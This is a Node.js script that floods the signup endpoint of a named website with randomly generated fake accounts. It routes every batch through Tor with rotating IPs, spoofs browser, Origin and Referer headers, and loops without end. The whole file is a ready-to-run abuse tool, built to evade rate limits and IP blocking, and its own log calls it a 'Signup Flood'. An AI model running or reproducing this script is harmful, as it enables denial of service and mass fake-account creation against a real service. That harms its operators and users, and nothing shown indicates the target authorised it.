const axios = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');

// ====================== CONFIG ======================
const URL = 'https://api.aryankaushik.space/api/auth/signup';
const TOR_PROXY = 'socks5://127.0.0.1:9050';     // tornet default port
const REQUESTS_PER_IP = 20;
const REQUEST_TIMEOUT = 10000;   // 10 seconds

const agent = new SocksProxyAgent(TOR_PROXY);

// Random string helper
function randomString(len = 10) {
    return Math.random().toString(36).substring(2, len + 2);
}

// Get current public IP through Tor
async function getCurrentIP() {
    try {
        const res = await axios.get('https://ipinfo.io/json', {
            httpsAgent: agent,
            timeout: REQUEST_TIMEOUT
        });
        console.log(`\n🌍 Current Tor IP: ${res.data.ip} (${res.data.city}, ${res.data.country})`);
        return res.data.ip;
    } catch (err) {
        console.log(`\n⚠️  Failed to get IP: ${err.message}`);
        return 'UNKNOWN';
    }
}

// Send one signup request and print full JSON response
async function sendSignup(count) {
    const rand = randomString(8);
    const username = `stress_${rand}`;
    const email = `${username}@duck.com`;
    const password = `Pass${rand}123!`;

    const payload = { username, email, password };

    try {
        const res = await axios.post(URL, payload, {
            httpsAgent: agent,
            timeout: REQUEST_TIMEOUT,
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': 'https://aeroweb.aryankaushik.space',
                'Referer': 'https://aeroweb.aryankaushik.space/'
            }
        });

        console.log(`[${count}] ${email} → ${res.status} | ${JSON.stringify(res.data)}`);
    } catch (err) {
        let status = err.response ? err.response.status : 'ERROR';
        let body = err.response ? JSON.stringify(err.response.data) : err.message;
        console.log(`[${count}] ${email} → ${status} | ${body}`);
    }
}

// ====================== MAIN LOOP ======================
async function main() {
    console.log("=== Tor + tornet Signup Flood Started ===\n");
    console.log("Make sure tornet is running: tornet --interval 3 --count 0\n");

    let batch = 1;

    while (true) {
        console.log(`\n🔄 === Batch ${batch} ===`);
        await getCurrentIP();

        console.log(`Sending ${REQUESTS_PER_IP} signup requests...\n`);

        for (let i = 1; i <= REQUESTS_PER_IP; i++) {
            await sendSignup(i);
        }

        console.log(`✅ Batch ${batch} finished (${REQUESTS_PER_IP} requests)\n`);
        batch++;

        // Wait a bit for tornet to rotate IP (adjust if needed)
        await new Promise(r => setTimeout(r, 500));
    }
}

main().catch(console.error);
